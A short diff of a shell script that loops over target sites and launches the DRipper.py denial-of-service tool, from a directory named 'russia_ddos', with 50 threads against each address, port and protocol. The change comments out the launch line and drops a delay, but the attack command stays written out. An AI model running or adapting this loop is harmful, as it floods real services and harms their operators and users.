@@ -63,8 +63,7 @@ do
              prot=$(echo $site | awk '{print $3}')
     echo $site
     echo $addr $port $prot
-    sleep 2
-             python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
+            # python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
    done
    
    # Restart DRipper_main after N seconds (default 600s = 10m)
